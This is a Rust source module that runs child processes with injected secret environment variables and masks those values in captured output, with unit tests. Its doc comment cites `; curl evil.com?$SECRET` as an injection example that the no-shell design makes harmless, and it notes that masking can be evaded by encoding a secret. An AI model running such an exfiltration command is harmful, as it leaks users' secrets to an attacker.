//! The injector: the only code that materializes plaintext outside the vault.
//!
//! Two things live here: running a child process with extra environment variables (the core of
//! the CLI's `kagisecure run` and of the MCP `run_with_env` tool, mcp-server.md §2.8), and
//! writing a `.env` file ([`envfile`], mcp-server.md §2.7).
//!
//! Two rules from that spec are load-bearing and are enforced here rather than by convention:
//!
//! 1. **No shell.** The program and its arguments go to the OS directly. There is no code path in
//!    this module that builds a command string, so `; curl evil.com?$SECRET` in an argument is
//!    just an argument.
//! 2. **Masking is best effort and is not a security boundary.** [`mask`] is an exact-value
//!    substring replacement. A command that base64s, reverses or splits a secret defeats it. It
//!    guards against accidental echo — a stack trace printing a connection string — not against a
//!    hostile command.

pub mod envfile;

use std::ffi::{OsStr, OsString};
use std::io::Read;
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use crate::error::{Error, Result};
use crate::model::Secret;

/// Default per-stream capture cap, matching mcp-server.md §2.8.
pub const DEFAULT_MAX_OUTPUT: usize = 64 * 1024;

/// How often the wait loop checks on a child that has a deadline.
const POLL_INTERVAL: Duration = Duration::from_millis(20);

/// One variable to place in the child's environment.
pub struct EnvInjection {
    /// Variable name. Metadata: it may be shown, logged and returned to an agent.
    pub name: String,
    /// Variable value. Never shown, never logged.
    pub value: Secret,
}

impl std::fmt::Debug for EnvInjection {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("EnvInjection")
            .field("name", &self.name)
            .field("value", &self.value)
            .finish()
    }
}

/// What to run and with what.
pub struct RunRequest<'a> {
    /// Executable. **Not** a shell string.
    pub program: &'a OsStr,
    /// Arguments, passed to the OS verbatim.
    pub args: &'a [OsString],
    /// Variables to add to the inherited environment.
    pub env: &'a [EnvInjection],
    /// Working directory for the child; the parent's if `None`.
    pub cwd: Option<&'a Path>,
    /// Replace injected values in the captured output with `[kagisecure:redacted:NAME]`.
    pub mask_output: bool,
    /// Per-stream cap on captured bytes.
    pub max_output: usize,
    /// Wall-clock limit. `None` waits forever, which is what the CLI's own `run` does.
    pub timeout: Option<Duration>,
}

impl<'a> RunRequest<'a> {
    /// A request with masking on and the default output cap.
    #[must_use]
    pub fn new(program: &'a OsStr, args: &'a [OsString], env: &'a [EnvInjection]) -> Self {
        Self {
            program,
            args,
            env,
            cwd: None,
            mask_output: true,
            max_output: DEFAULT_MAX_OUTPUT,
            timeout: None,
        }
    }
}

/// The result of running a child.
#[derive(Debug, Default)]
pub struct RunOutcome {
    /// Exit status, or `None` if the child was killed by a signal.
    pub exit_code: Option<i32>,
    /// Captured stdout, masked if requested and truncated to the cap.
    pub stdout: Vec<u8>,
    /// Captured stderr, masked if requested and truncated to the cap.
    pub stderr: Vec<u8>,
    /// Whether stdout hit the cap.
    pub stdout_truncated: bool,
    /// Whether stderr hit the cap.
    pub stderr_truncated: bool,
    /// How many injected values were replaced across both streams.
    pub masked: usize,
    /// Whether the child was killed for exceeding [`RunRequest::timeout`].
    pub timed_out: bool,
}

/// Run `request.program` with the injected environment and capture its output.
///
/// # Errors
///
/// [`Error::NonUtf8EnvValue`] if a value cannot be represented as an environment value, and
/// [`Error::Spawn`] if the program could not be started. Neither error carries a value.
pub fn run_with_env(request: &RunRequest<'_>) -> Result<RunOutcome> {
    let mut command = Command::new(request.program);
    command.args(request.args);
    command.stdin(Stdio::null());
    command.stdout(Stdio::piped());
    command.stderr(Stdio::piped());
    if let Some(dir) = request.cwd {
        command.current_dir(dir);
    }
    for injection in request.env {
        command.env(&injection.name, env_value(injection)?);
    }

    let mut child = command.spawn().map_err(|e| Error::Spawn {
        program: request.program.to_string_lossy().into_owned(),
        reason: e.to_string(),
    })?;

    // Both pipes are drained on their own threads. Reading them in sequence would deadlock the
    // moment a child fills the other pipe's buffer, which is exactly what a chatty build does.
    let cap = request.max_output;
    let out_handle = child.stdout.take().map(|pipe| drain(pipe, cap));
    let err_handle = child.stderr.take().map(|pipe| drain(pipe, cap));

    let (status, timed_out) = wait_for(&mut child, request.timeout)?;

    let (mut stdout, stdout_truncated) = out_handle.map_or_else(
        || (Vec::new(), false),
        |h| h.join().unwrap_or_else(|_| (Vec::new(), false)),
    );
    let (mut stderr, stderr_truncated) = err_handle.map_or_else(
        || (Vec::new(), false),
        |h| h.join().unwrap_or_else(|_| (Vec::new(), false)),
    );

    let mut masked = 0;
    if request.mask_output {
        masked += mask(&mut stdout, request.env);
        masked += mask(&mut stderr, request.env);
    }

    Ok(RunOutcome {
        exit_code: status.and_then(|s| s.code()),
        stdout,
        stderr,
        stdout_truncated,
        stderr_truncated,
        masked,
        timed_out,
    })
}

/// Read a pipe to the cap on its own thread, reporting whether it hit the cap.
fn drain<R: Read + Send + 'static>(
    mut pipe: R,
    cap: usize,
) -> std::thread::JoinHandle<(Vec<u8>, bool)> {
    std::thread::spawn(move || {
        let mut buf = Vec::new();
        let mut chunk = [0u8; 8192];
        let mut truncated = false;
        loop {
            match pipe.read(&mut chunk) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if buf.len() >= cap {
                        truncated = true;
                        continue;
                    }
                    let room = cap - buf.len();
                    if n > room {
                        buf.extend_from_slice(&chunk[..room]);
                        truncated = true;
                    } else {
                        buf.extend_from_slice(&chunk[..n]);
                    }
                }
            }
        }
        (buf, truncated)
    })
}

/// Wait for the child, killing it if it outlives `timeout`.
fn wait_for(
    child: &mut std::process::Child,
    timeout: Option<Duration>,
) -> Result<(Option<std::process::ExitStatus>, bool)> {
    let Some(limit) = timeout else {
        return Ok((Some(child.wait()?), false));
    };
    let deadline = Instant::now() + limit;
    loop {
        if let Some(status) = child.try_wait()? {
            return Ok((Some(status), false));
        }
        if Instant::now() >= deadline {
            let _ = child.kill();
            let _ = child.wait();
            return Ok((None, true));
        }
        std::thread::sleep(POLL_INTERVAL);
    }
}

#[cfg(unix)]
fn env_value(injection: &EnvInjection) -> Result<OsString> {
    use std::os::unix::ffi::OsStrExt;
    if injection.value.expose().contains(&0) {
        return Err(Error::NonUtf8EnvValue(injection.name.clone()));
    }
    Ok(OsStr::from_bytes(injection.value.expose()).to_owned())
}

#[cfg(not(unix))]
fn env_value(injection: &EnvInjection) -> Result<OsString> {
    injection
        .value
        .expose_str()
        .filter(|s| !s.contains('\0'))
        .map(OsString::from)
        .ok_or_else(|| Error::NonUtf8EnvValue(injection.name.clone()))
}

/// Replace every occurrence of an injected value with `[kagisecure:redacted:NAME]`, returning the
/// number of replacements.
///
/// Longer values are replaced first, so that a secret which happens to contain another secret as a
/// prefix does not leave the remainder visible. Empty values are skipped — replacing the empty
/// string everywhere would destroy the output and protect nothing.
///
/// **This is not a security boundary.** See the module documentation.
#[must_use]
pub fn mask(buf: &mut Vec<u8>, injections: &[EnvInjection]) -> usize {
    let mut order: Vec<&EnvInjection> = injections.iter().filter(|i| !i.value.is_empty()).collect();
    order.sort_by_key(|i| std::cmp::Reverse(i.value.len()));

    let mut count = 0;
    for injection in order {
        let needle = injection.value.expose();
        let replacement = format!("[kagisecure:redacted:{}]", injection.name).into_bytes();
        let mut out: Vec<u8> = Vec::with_capacity(buf.len());
        let mut i = 0;
        while i < buf.len() {
            if buf[i..].starts_with(needle) {
                out.extend_from_slice(&replacement);
                i += needle.len();
                count += 1;
            } else {
                out.push(buf[i]);
                i += 1;
            }
        }
        *buf = out;
    }
    count
}

#[cfg(test)]
mod tests {
    use super::*;

    fn injection(name: &str, value: &str) -> EnvInjection {
        EnvInjection {
            name: name.to_owned(),
            value: Secret::from_string(value.to_owned()),
        }
    }

    #[test]
    fn masks_exact_values() {
        let mut buf = b"connecting with sk_live_abcdef now".to_vec();
        let n = mask(&mut buf, &[injection("STRIPE_KEY", "sk_live_abcdef")]);
        assert_eq!(n, 1);
        assert_eq!(
            String::from_utf8(buf).unwrap(),
            "connecting with [kagisecure:redacted:STRIPE_KEY] now"
        );
    }

    #[test]
    fn masks_every_occurrence_and_counts_them() {
        let mut buf = b"aaa bbb aaa".to_vec();
        assert_eq!(mask(&mut buf, &[injection("A", "aaa")]), 2);
        assert!(!String::from_utf8(buf).unwrap().contains("aaa"));
    }

    #[test]
    fn masks_the_longer_value_first() {
        let mut buf = b"token=abcdef".to_vec();
        let _ = mask(
            &mut buf,
            &[injection("SHORT", "abc"), injection("LONG", "abcdef")],
        );
        assert_eq!(
            String::from_utf8(buf).unwrap(),
            "token=[kagisecure:redacted:LONG]"
        );
    }

    #[test]
    fn empty_values_are_not_masked() {
        let mut buf = b"unchanged".to_vec();
        assert_eq!(mask(&mut buf, &[injection("EMPTY", "")]), 0);
        assert_eq!(buf, b"unchanged");
    }

    #[test]
    fn masks_binary_output_too() {
        let mut buf = b"\x00\x01secret\xff".to_vec();
        assert_eq!(mask(&mut buf, &[injection("S", "secret")]), 1);
        assert!(!buf.windows(6).any(|w| w == b"secret"));
    }

    #[test]
    fn debug_of_an_injection_hides_the_value() {
        let rendered = format!("{:?}", injection("K", "hunter2"));
        assert!(rendered.contains('K'));
        assert!(!rendered.contains("hunter2"));
    }

    #[test]
    fn a_draining_thread_stops_at_the_cap_and_says_so() {
        let (buf, truncated) = drain(std::io::Cursor::new(vec![b'x'; 10]), 4)
            .join()
            .unwrap();
        assert_eq!(buf, b"xxxx");
        assert!(truncated);

        let (buf, truncated) = drain(std::io::Cursor::new(vec![b'x'; 3]), 4)
            .join()
            .unwrap();
        assert_eq!(buf, b"xxx");
        assert!(!truncated);
    }
}
